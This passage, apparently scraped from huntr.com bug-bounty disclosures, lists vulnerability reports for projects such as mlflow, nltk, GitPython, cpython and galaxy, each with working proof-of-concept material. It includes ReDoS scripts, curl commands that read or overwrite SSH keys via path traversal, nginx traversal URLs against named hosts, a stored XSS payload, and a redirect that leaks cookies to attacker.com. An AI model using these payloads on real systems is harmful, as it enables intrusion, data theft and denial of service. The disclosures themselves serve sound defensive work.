listner\nhttp://mysite.com/redirect.php?url=http://attacker.com:8182/\n//redirect.php\n<?php\n$url=$_GET[\"url\"];\nheader(\"Location: $url\");\n\n/* Make sure that code below does not get executed when we redirect. */\nexit;\n?>\nnetcat listner in http://attacker.com\nnc -lnvp 8182\nSTEP TO RERPODUCE\nrun bellow code\nclass QuotesSpider(scrapy.Spider):\n    name = \"quotes\"\n\n    def start_requests(self):\n        urls = [\n                'http://mysite.com/redirect.php?url=http://attacker.com:8182/mm',\n        ]\n        for url in urls:\n            yield scrapy.Request(url=url,cookies={'currency': 'USD', 'country': 'UY'},callback=self.parse)\n\n    def parse(self, response):\n        page = response.url.split(\"/\")[-2]\n        filename = f'quotes-{page}.html'\n        with open(filename, 'wb') as f:\n            f.write(response.body)\n        self.log(f'Saved file {filename}')\nresponse received in attacker netcat\nConnection from 127.0.0.1 46190 received!\nGET /robots.txt HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en\nUser-Agent: Scrapy/2.5.1 (+https://scrapy.org)\nAccept-Encoding: gzip, deflate, br\nCookie: currency=USD; country=UY\nHost: mysite.com:8182\nSo, here i provided cookie for mysite.com but due to redirect it leaks to thirdparty site\nSUGGESTED FIX\nIf provided url domain and redirect url domain is same then you can only send cookie header to redirected url . But if the both domain not same then its a third party site which will be redirected, so you dont need to send Cookie header."}, "https://huntr.com/bounties/71d9979b-bd8c-4571-84e6-15a8c3970e06/": {"cve": "", "cve_link": "", "cwe": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor", "cwe_link": "https://cwe.mitre.org/data/definitions/200.html", "severity_score": "Medium (6.6)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/opendatacube/odc-tools", "fix_commit": "https://www.github.com/opendatacube/odc-tools/commit/1339295ffbe062daede947fdfb4cc53efc4b8033", "description": "Description\nInformation Disclosure AWS PrincipleID, sourceIPAddress, configurationId and more.\nProof of Concept\nhttps://raw.githubusercontent.com/opendatacube/odc-tools/develop/apps/dc_tools/tests/data/sentinel-2-nrt_2020_08_21.json\nImpact\nLeaks Sensitive Data"}, "https://huntr.com/bounties/8549d81f-dc45-4af7-9f2a-2d70752d8524/": {"cve": "", "cve_link": "", "cwe": "CWE-1333: Inefficient Regular Expression Complexity", "cwe_link": "https://cwe.mitre.org/data/definitions/1333.html", "severity_score": "Medium (4.2)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/gitpython-developers/gitpython", "fix_commit": "https://www.github.com/gitpython-developers/gitpython/commit/75f4f63ab3856a552f06082aabf98845b5fa21e3", "description": "Description\nIn the latest version of GitPython (cd29f07b) I discovered regular expression that is vulnerable to ReDoS (Regular Expression Denial of Service)\nProof of Concept\nPoC based on code in git/remote.py\nimport logging\nimport re\n\nlogging.basicConfig(format='%(asctime)s - %(levelname)s: %(message)s',\n                    level=logging.DEBUG)\n\npattern = re.compile(r'^\\s*(.) (\\[?[\\w\\s\\.$@]+\\]?)\\s+(.+) -> ([^\\s]+)(    \\(.*\\)?$)?')\n\nfor i in range(1, 10000):\n    s = ' ' * i * 100 + '->'\n    logging.debug('Started with {} spaces'.format(i * 100))\n    pattern.match(s)\n    logging.debug('Finished with {} spaces'.format(i * 100))\nOutput:\n2022-02-10 21:05:36,247 - DEBUG: Started with 100 spaces\n2022-02-10 21:05:36,326 - DEBUG: Finished with 100 spaces\n2022-02-10 21:05:36,326 - DEBUG: Started with 200 spaces\n2022-02-10 21:05:38,765 - DEBUG: Finished with 200 spaces\n2022-02-10 21:05:38,765 - DEBUG: Started with 300 spaces\n2022-02-10 21:05:50,383 - DEBUG: Finished with 300 spaces\n2022-02-10 21:05:50,383 - DEBUG: Started with 400 spaces\n2022-02-10 21:06:22,743 - DEBUG: Finished with 400 spaces\n2022-02-10 21:06:22,743 - DEBUG: Started with 500 spaces\n2022-02-10 21:07:41,996 - DEBUG: Finished with 500 spaces\n2022-02-10 21:07:41,997 - DEBUG: Started with 600 spaces\n2022-02-10 21:10:23,773 - DEBUG: Finished with 600 spaces\n2022-02-10 21:10:23,774 - DEBUG: Started with 700 spaces\n2022-02-10 21:15:21,380 - DEBUG: Finished with 700 spaces\n2022-02-10 21:15:21,380 - DEBUG: Started with 800 spaces\n2022-02-10 21:23:46,983 - DEBUG: Finished with 800 spaces\nImpact\nThis issues may lead to a denial of service if user controls input passed to pattern matching function."}, "https://huntr.com/bounties/4adbcccf-fb0a-4996-bea4-8da2bf2942b1/": {"cve": "", "cve_link": "", "cwe": "CWE-1333: Inefficient Regular Expression Complexity", "cwe_link": "https://cwe.mitre.org/data/definitions/1333.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/python/cpython", "fix_commit": "https://www.github.com/python/cpython/commit/1514d1252f96e6a83eb65c439522a6b5443f6a1a", "description": "Description\nIn recent cpython version (31ff9671) I discovered regular expression that is vulnerable to ReDoS (Regular Expression Denial of Service). Vulnerability exists in EntryPoint class which is used to parse package/module entry-points.\nProof of Concept\nSimplified PoC based on init.py\nimport logging\nimport re\n\n\nlogging.basicConfig(format='%(asctime)s - %(levelname)s: %(message)s',\n                    level=logging.DEBUG)\n\npattern = re.compile(\n    r'(?P<module>[\\w.]+)\\s*'\n    r'(:\\s*(?P<attr>[\\w.]+))?\\s*'\n    r'(?P<extras>\\[.*\\])?\\s*$'\n)\n\nfor i in range(1, 10000):\n    s = '0' + ' ' * 1000 * i + '0'\n    logging.debug('Started with {} spaces'.format(1000 * i))\n    pattern.match(s)\n    logging.debug('Finished with {} spaces'.format(1000 * i))\nOutput:\n2021-12-22 16:03:30,754 - DEBUG: Started with 1000 spaces\n2021-12-22 16:03:34,566 - DEBUG: Finished with 1000 spaces\n2021-12-22 16:03:34,566 - DEBUG: Started with 2000 spaces\n2021-12-22 16:04:05,817 - DEBUG: Finished with 2000 spaces\n2021-12-22 16:04:05,817 - DEBUG: Started with 3000 spaces\n2021-12-22 16:05:49,228 - DEBUG: Finished with 3000 spaces\n2021-12-22 16:05:49,228 - DEBUG: Started with 4000 spaces\n2021-12-22 16:09:46,348 - DEBUG: Finished with 4000 spaces\n2021-12-22 16:09:46,349 - DEBUG: Started with 5000 spaces\n2021-12-22 16:17:31,514 - DEBUG: Finished with 5000 spaces\n2021-12-22 16:17:31,514 - DEBUG: Started with 6000 spaces\n2021-12-22 16:30:40,249 - DEBUG: Finished with 6000 spaces\n2021-12-22 16:30:40,249 - DEBUG: Started with 7000 spaces\n2021-12-22 16:51:40,826 - DEBUG: Finished with 7000 spaces\nYou can see that using more spaces extends running time.\nImpact\nThis issue may lead to a denial of service."}, "https://huntr.com/bounties/c85354c7-4490-4fad-a32c-03f9f4bdcb63/": {"cve": "", "cve_link": "", "cwe": "CWE-1333: Inefficient Regular Expression Complexity", "cwe_link": "https://cwe.mitre.org/data/definitions/1333.html", "severity_score": "Medium (6.2)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/idank/explainshell", "fix_commit": "https://www.github.com/idank/explainshell/commit/d35f949af4e4391a7e563d260dd102b80aeeb545", "description": "Description\nIn the latest version of explainshell (ebc5e9f2) I discovered regular expression that is vulnerable to ReDoS (Regular Expression Denial of Service)\nProof of Concept\nPoC based on code in explainshell/options.py\nimport logging\nimport re\n\nif __name__ == \"__main__\":\n    logging.basicConfig(format='%(asctime)s - %(levelname)s: %(message)s',\n                        level=logging.DEBUG)\n    opt_regex = re.compile(r'''\n        (?P<opt>--?(?:\\?|\\#|(?:\\w+-)*\\w+))  # option starts with - or -- and can have - in the middle but not at the end, also allow '-?'\n        (?:\n         (?:\\s*(=)?\\s*)           # -a=\n         (?P<argoptional>[<\\[])?  # -a=< or -a=[\n         (?:\\s*(=)?\\s*)           # or maybe -a<=\n         (?P<arg>\n          (?(argoptional)         # if we think we have an arg (we saw [ or <)\n           [^\\]>]+                # either read everything until the closing ] or >\n           |\n           (?(2)\n            [-a-zA-Z]+             # or if we didn't see [ or < but just saw =, read all letters, e.g. -a=abc\n            |\n            [A-Z]+                # but if we didn't have =, only allow uppercase letters, e.g. -a FOO\n           )\n          )\n         )\n         (?(argoptional)(?P<argoptionalc>[\\]>])) # read closing ] or > if we have an arg\n        )?                        # the whole arg thing is optional\n        (?P<ending>,\\s*|\\s+|\\Z|/|\\|)''', re.X) # read any trailing whitespace or the end of the string\n\n    for i in range(1, 10000):\n        s = '-?' + ' ' * i * 100\n\n        logging.debug('Started with {} spaces'.format(i * 100))\n        opt_regex.match(s, 0)\n        logging.debug('Finished with {} spaces'.format(i * 100))\nOutput:\n2021-12-22 16:57:29,670 - DEBUG: Started with 100 spaces\n2021-12-22 16:57:29,853 - DEBUG: Finished with 100 spaces\n2021-12-22 16:57:29,853 - DEBUG: Started with 200 spaces\n2021-12-22 16:57:35,690 - DEBUG: Finished with 200 spaces\n2021-12-22 16:57:35,690 - DEBUG: Started with 300 spaces\n2021-12-22 16:58:00,872 - DEBUG: Finished with 300 spaces\n2021-12-22 16:58:00,873 - DEBUG: Started with 400 spaces\n2021-12-22 16:59:12,585 - DEBUG: Finished with 400 spaces\n2021-12-22 16:59:12,585 - DEBUG: Started with 500 spaces\n2021-12-22 17:02:08,048 - DEBUG: Finished with 500 spaces\n2021-12-22 17:02:08,048 - DEBUG: Started with 600 spaces\n2021-12-22 17:08:26,772 - DEBUG: Finished with 600 spaces\n2021-12-22 17:08:26,772 - DEBUG: Started with 700 spaces\n2021-12-22 17:20:05,980 - DEBUG: Finished with 700 spaces\n2021-12-22 17:20:05,980 - DEBUG: Started with 800 spaces\n2021-12-22 17:39:39,827 - DEBUG: Finished with 800 spaces\n2021-12-22 17:39:39,827 - DEBUG: Started with 900 spaces\n2021-12-22 18:14:06,240 - DEBUG: Finished with 900 spaces\n2021-12-22 18:14:06,240 - DEBUG: Started with 1000 spaces\n2021-12-22 19:12:37,211 - DEBUG: Finished with 1000 spaces\nImpact\nThis issues may lead to a denial of service if user controls input passed to pattern matching function."}, "https://huntr.com/bounties/761a761e-2be2-430a-8d92-6f74ffe9866a/": {"cve": "CVE-2021-3842", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3842", "cwe": "CWE-1333: Inefficient Regular Expression Complexity", "cwe_link": "https://cwe.mitre.org/data/definitions/1333.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/nltk/nltk", "fix_commit": "https://www.github.com/nltk/nltk/commit/2a50a3edc9d35f57ae42a921c621edc160877f4d", "description": "Description\nnltk is vulnerable to ReDoS attack because of ^-?[0-9]+(.[0-9]+)?$ regex. If attacker succeeds to use malicious payload against RegexpTagger used in function get_pos_tagger and malt_regex_tagger, it will cause a nasty DoS.\nProof of Concept\n// PoC.py\nimport re, time\n\npattern = re.compile(\"^-?[0-9]+(.[0-9]+)?$\")\ns = \"-\"\ns += \"0\" * 50000\ns += \"q\"\n\nt = time.time()\nprint(\"searching...\")\nre.search(pattern, s)\nprint(time.time() - t)\nOn my new machine I needed only 50k characters to cause a 23+ seconds matching. For instance, in similar report to this project 160k characters were processed just in 3+ seconds.\nIssue\nThe issue here is that in ^-?[0-9]+(.[0-9]+)?$ groups [0-9]+(.[0-9]+) match each other, which causes a nasty backtracking in case of failure.\nImpact\nThis vulnerability is capable of causing DoS due to CPU resources consumption."}, "https://huntr.com/bounties/21f54607-40a0-4970-a950-2fc1b74f99a5/": {"cve": "", "cve_link": "", "cwe": "CWE-1333: Inefficient Regular Expression Complexity", "cwe_link": "https://cwe.mitre.org/data/definitions/1333.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/0ff11b5fc9564446e3dfc127ea8bb8fbb5bb6339", "description": "\u270d\ufe0f Description\nThe pyload package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide crafted HTML comments as input to the comments function of utils/web/purge.py may cause an application to consume an excessive amount of CPU. Below pinned line using vulnerable regex.\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nReproducer where we\u2019ve copied the relevant code:\nhttps://github.com/pyload/pyload/blob/127beb0ea3b9c9c23991cbde7d83dc9d892d2d5c/src/pyload/core/utils/web/purge.py#L7 https://github.com/pyload/pyload/blob/127beb0ea3b9c9c23991cbde7d83dc9d892d2d5c/src/pyload/core/utils/web/purge.py#L12-L14\nPut the below in a poc.js file and run with node\nimport time\nimport re\n_RE_COMMENTS = re.compile(r\"<!--.*?-->\", flags=re.S)\n\n\ndef comments(value):\n    \"\"\"Removes HTML comments from a text string.\"\"\"\n    return _RE_COMMENTS.sub(\"\", value).strip()\n\nfor i in range(1, 50000):\n    start_time = time.perf_counter()\n    payload = \"\"+\"<!--\"*(i*10000)+\"-\"\n    comments(payload)\n    stop_time = time.perf_counter() - start_time\n    print(\"Payload.length: \" + str(len(payload)) + \": \" + str(stop_time) + \" ms\")\nCheck the Output:\nPayload.length: 40001: 2.9121267 ms\nPayload.length: 80001: 10.2797351 ms\nPayload.length: 120001: 27.080219800000002 ms\nPayload.length: 160001: 45.3576031 ms\nPayload.length: 200001: 66.31825060000001 ms\n--\n--\n\ud83d\udca5 Impact\nThis vulnerability is capable of exhausting system resources and leads to crashes."}, "https://huntr.com/bounties/d19aed43-75bc-4a03-91a0-4d0bb516bc32/": {"cve": "CVE-2021-3828", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3828", "cwe": "CWE-1333: Inefficient Regular Expression Complexity", "cwe_link": "https://cwe.mitre.org/data/definitions/1333.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/nltk/nltk", "fix_commit": "https://www.github.com/nltk/nltk/commit/277711ab1dec729e626b27aab6fa35ea5efbd7e6", "description": "\u270d\ufe0f Description\nThe nltk package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide as an input to the _read_comparison_block() function in the file \"nltk/corpus/reader/comparative_sents.py\" may cause an application to consume an excessive amount of CPU. Below pinned line using vulnerable regex.\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nReproducer where we\u2019ve copied the relevant code:\nhttps://github.com/nltk/nltk/blob/d21646dbd547cdd02d0c60f8e23d1d28a9fd1266/nltk/corpus/reader/comparative_sents.py#L259 https://github.com/nltk/nltk/blob/d21646dbd547cdd02d0c60f8e23d1d28a9fd1266/nltk/corpus/reader/comparative_sents.py#L48\nPut the below in a poc.py file and run with node\nimport time\nimport re\n\nevil_regex = re.compile(r\"\\((?!.*\\()(.*)\\)$\")\n\nfor i in range(1, 50000):\n    start_time = time.perf_counter()\n    payload = \"( \"+\"(\"*(i*40000)+\"\"\n    re.findall(evil_regex, payload)\n    stop_time = time.perf_counter() - start_time\n    print(\"Payload.length: \" + str(len(payload)) + \": \" + str(stop_time) + \" ms\")\nCheck the Output:\nPayload.length: 40002: 0.2007029 ms\nPayload.length: 80002: 0.8401304 ms\nPayload.length: 120002: 1.8615463 ms\nPayload.length: 160002: 3.2876105 ms"}, "https://huntr.com/bounties/15d563b2-ce1c-4757-996c-bdf340f2e4ec/": {"cve": "", "cve_link": "", "cwe": "CWE-1333: Inefficient Regular Expression Complexity", "cwe_link": "https://cwe.mitre.org/data/definitions/1333.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/alvations/sacremoses", "fix_commit": "https://www.github.com/alvations/sacremoses/commit/8ad457e3cc25579140757befffd6f0e3b421728d", "description": "\u270d\ufe0f Description\nThe sacremoses package is vulnerable to ReDoS (regular expression denial of service). An attacker that is able to provide a crafted text as input to the has_numeric_only function may cause an application to consume an excessive amount of CPU. Below pinned line using vulnerable regex.\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nReproducer where we\u2019ve copied the relevant code:\nhttps://github.com/alvations/sacremoses/blob/dc203fb2b41e1f8c8bbbd4606732945e6cdb090e/sacremoses/tokenize.py#L366\nPut the below in a poc.py file and run\nimport time\nimport re\n\ndef has_numeric_only(text):\n        return bool(re.search(r\"(.*)[\\s]+(\\#NUMERIC_ONLY\\#)\", text))\n\nfor i in range(1, 50000):\n    start_time = time.perf_counter()\n    payload = \" \" + \" \" * (i*500) + \"\"\n    has_numeric_only(payload)\n    stop_time = time.perf_counter() - start_time\n    print(\"Payload.length: \" + str(len(payload)) + \": \" + str(stop_time) + \" ms\")\nCheck the Output:\nPayload.length: 501: 0.2941443 ms\nPayload.length: 1001: 2.5347709000000003 ms\nPayload.length: 1501: 9.3377153 ms\nPayload.length: 2001: 21.428344199999998 ms\nPayload.length: 2501: 40.7420754 ms\n--\n--\n\ud83d\udca5 Impact\nThis vulnerability is capable of exhausting system resources and leads to crashes."}, "https://huntr.com/bounties/b397b83a-527a-47e7-b912-a12a17a6cfb4/": {"cve": "CVE-2023-6753", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6753", "cwe": "CWE-22: Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/22.html", "severity_score": "Critical (9.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/1c6309f884798fbf56017a3cc808016869ee8de4", "description": "Description\nIf we observe the code highlighted in https://huntr.com/bounties/93e470d7-b6f0-409b-af63-49d3e2a26dbc/\nNotice that the fix only fully fixes the case where the filename is controlled by Content-Disposition.\nHowever, if the filename is controlled by the path of the URL, then the code uses posixpath.basename -https://github.com/mlflow/mlflow/blob/master/mlflow/data/http_dataset_source.py#L74 - to determine the basename of the filename. This means that if the filename is controlled by the path of the URL on Windows then it is possible to write files outside of the current working directory using backslash '\\' instead of front slash '/' as posixpath.basename does not work with Windows paths.\nProof of Concept\nRun the following server.\nfrom flask import Flask, Response\napp = Flask(__name__)\n\n@app.route(\"/\\\\Users\\\\User\\\\poc.txt\")\ndef index():\n    res = Response(\"\"\"\n\"fixed acidity\";\"volatile acidity\";\"citric acid\";\"residual sugar\";\"chlorides\";\"free sulfur dioxide\";\"total sulfur dioxide\";\"density\";\"pH\";\"sulphates\";\"alcohol\";\"quality\"\n7.4;0.7;0;1.9;0.076;11;34;0.9978;3.51;0.56;9.4;5\n7.8;0.88;0;2.6;0.098;25;67;0.9968;3.2;0.68;9.8;5\n    \"\"\")\n    return res\n\napp.run(\"0.0.0.0\", 4444)\nThen, run the following on Windows, make sure to replace the \\Users\\User\\poc.txt to whatever directory you control.\nimport mlflow.data\nimport pandas as pd\nfrom mlflow.data.pandas_dataset import PandasDataset\n\ndataset_source_url = \"http://localhost:4444/\\\\Users\\\\User\\\\poc.txt\"\ndf = pd.read_csv(dataset_source_url)\ndataset: PandasDataset = mlflow.data.from_pandas(df, source=dataset_source_url)\n\nwith mlflow.start_run():\n    mlflow.log_input(dataset, context=\"training\")\n\nrun = mlflow.get_run(mlflow.last_active_run().info.run_id)\ndataset_info = run.inputs.dataset_inputs[0].dataset\n\ndataset_source = mlflow.data.get_source(dataset_info)\ndataset_source.load()\nThe file should be written to \\Users\\User\\poc.txt or whichever directory you specified.\nImpact\nArbitrary File Write when loading datasets and possible RCE if files such as SSH keys are overwritten. This requires user to pass in a malicious URL, but they can be easily tricked to do so if the attacker says that the dataset is at https://XYZ.com/[long-string-of-garbage-characters]/[malicious-path-here]. (Users are very unlikely to check the path of a URL)"}, "https://huntr.com/bounties/43e6fb72-676e-4670-a225-15d6836f65d3/": {"cve": "CVE-2023-6015", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6015", "cwe": "CWE-22: Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/22.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/cf83dad4df26dd4a850622fe8a51ccab1471a5e7", "description": "Description\nIn https://github.com/mlflow/mlflow/blob/d2f34c39c97f342e238a2d87a1c288cee825fcbe/mlflow/server/handlers.py#L525. The checks can be bypassed using C:...\nIf you don't know what starting a path on Windows with C: does, basically if a path starts with C: on Windows then we treat is such that we remove the drive letter and colon from the beginning. For instance a path C:../.ssh/id_rsa will get converted to ../.ssh/id_rsa. As such we can break out of the root dirrectory up to 1 layer. A good way to break out of the root mlflow directory is /api/2.0/mlflow-artifacts/artifacts endpoint. If we assume that the directory root is C://Users/User/mlflowui, then querying the endpoint /api/2.0/mlflow-artifacts/artifacts allows us to break out of the root C://Users/User/mlflowui directory and obtain files from C://Users/User, which can include the SSH key.\nPOC\nIn C://Users/<User> of your windows machine\n1: Add secret text into C://Users/<User>/.ssh/id_rsa\n2: Create mlflowui directory which you will run mlflow from there.\\\n3: Run mlflow uiin C://Users/<User>/mlflowui\n4: Then curl to retrieve the contents:\ncurl -vv \"http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/C:../.ssh/id_rsa\"\nExtra: You can also perform arbitrary file write on the system (which can overwrite models/data and cause RCE by overwriting the python files etc.) by performing a PUT instead of a GET\ncurl -X PUT --data-binary test \"http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/C:../.ssh/id_rsa\"\nAbove overwrites id_rsa file.\nImpact\nRead sensitive data from Windows host (which can include the SSH key)\nSeverity taken from https://huntr.mlsecops.com/bounties/1fe8f21a-c438-4cba-9add-e8a5dab94e28/\nMore info about these paths https://stackoverflow.com/questions/23955968/windows-path-with-no-slash-after-drive-letter-and-colon-what-does-it-point-to"}, "https://huntr.com/bounties/f7d2a6ab-2faf-4719-bdb6-e4e5d6065752/": {"cve": "CVE-2022-3389", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3389", "cwe": "CWE-22: Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/22.html", "severity_score": "High (8.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/323383d1db656f1b1291be529947bd943a6b0e99", "description": "Description\nPath Traversal successful exploitation could allow an attacker to traverse the file system to access files or directories that are outside of the restricted directory on the remote server.\nProof of Concept\nNote: If you can not see the poc image , you can follow this link https://imgur.com/a/1svTNB4\nImpact\nArbitrary file read. This could leak sensitive system files or any file present on the system."}, "https://huntr.com/bounties/de06a143-c622-4ec7-95f8-4f590a2d2a8d/": {"cve": "", "cve_link": "", "cwe": "CWE-22: Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/22.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pokeapi/pokeapi", "fix_commit": "https://www.github.com/pokeapi/pokeapi/commit/eb5b34405a5add494787193347e1c5711534d1df", "description": "\u270d\ufe0f Description\nA path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with \u201cdot-dot-slash (../)\u201d sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).\nNGINX is a web server which can also be used as a reverse proxy, load balancer, mail proxy and HTTP cache. The NGINX alias directive defines a replacement for the specified location.\nThe incorrect configuration of the alias could allow an attacker to read file stored outside the target folder.\nIn particular, the locations /graphql/console is configured to have aliases /public-console/, which the location doesn't ends with directory separator (/) in nginx configuration file nginx.conf.\nRemediation\nFind all NGINX alias directives and make sure that the parent prefixed location ends with directory separator."}, "https://huntr.com/bounties/3116e2f4-38f5-44e6-a34d-fadadb065e65/": {"cve": "", "cve_link": "", "cwe": "CWE-22: Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/22.html", "severity_score": "High (7.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/welliamcao/opsmanage", "fix_commit": "https://www.github.com/welliamcao/opsmanage/commit/9cd6b1b94dd0e4489017ebcaa0fe0438e59f0689", "description": "\u6f0f\u6d1e\nREADME.md\u6587\u4ef6\u4e2d\u7684nginx\u914d\u7f6e\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u4efb\u610f\u8bfb\u53d6\u9879\u76ee\u4e2d\u7684\u6587\u4ef6\u3002\nPOC\n\u5bf9\u4e8egithub\u4e0a\u7684demo\u5730\u5740\uff0c\u4e00\u79cd\u53ef\u884c\u7684\u653b\u51fb\u65b9\u5f0f\u4e3a\uff1a\nhttp://42.194.214.22:8000/static../\n\u53ef\u4ee5\u770b\u5230\u8bfb\u53d6\u5230\u6574\u4e2a\u9879\u76ee\u7684\u6587\u4ef6\u3002\u5982\u679c\u7528\u6237\u5bf9\u8be5\u9879\u76ee\u8fdb\u884c\u8fc7\u4e8c\u5f00\uff0c\u5e76\u5728init.sql\uff0cconf/\u4e2d\u5199\u5165\u4e86\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\uff0c\u53ef\u80fd\u9020\u6210\u8f83\u5927\u5371\u5bb3\n\u5f71\u54cd\n\u653b\u51fb\u8005\u53ef\u4ee5\u8bfb\u53d6\u9879\u76ee\u76ee\u5f55\u4e0b\u4efb\u610f\u6587\u4ef6"}, "https://huntr.com/bounties/802ee776-0d95-4e9d-804e-8c6b6690de0a/": {"cve": "", "cve_link": "", "cwe": "CWE-22: Path Traversal", "cwe_link": "https://cwe.mitre.org/data/definitions/22.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/rhizome-conifer/conifer", "fix_commit": "https://www.github.com/rhizome-conifer/conifer/commit/2374ed9216e3ea00c8faab97193fd72029eaf351", "description": "Description\nmisconfigurations of nginx lead to a path traversal vulnerability.\nProof of Concept\nAn attacker can access files like this:\nhttps://conifer.rhizome.org/static/app../admin.py\nhttps://conifer.rhizome.org/static/app../config/wr.yaml\nImpact\nAn attacker can access files on the web server to which they should not have access."}, "https://huntr.com/bounties/68708c1c-5c29-4aa8-859e-cc885dcc1062/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Generic", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/galaxyproject/galaxy", "fix_commit": "https://www.github.com/galaxyproject/galaxy/commit/44fed0dfa50c03ae2fc8a4f16448f32b249a0e23", "description": "Description\nThe 'description' and 'synopsis' fields of libraries are vulnerable to stored XSS injection. If a user sets the synopsis or description of a library to ''\"><img src=x onerror=alert(1);>' they can set a stored XSS payload that fires whenever someone visits the /libraries page. Normally libraries are only editable by admins, but it is possible for admins to give edit permissions for specific libraries to regular users, meaning that this vulnerability could be used by an attacker on a normal user account if an admin gives them edit permission for a library.\nProof of Concept\nAs an admin, create a new library and give a normal user edit permissions. As the normal user, edit the name and synopsis of the library to be ''\"><img src=x onerror=alert(1);>'. Visit the page on any account and notice that the XSS is stored in the /libraries page when anyone visits it.\nImpact\nAn attacker can execute arbitrary Javascript in a victim's browser."}, 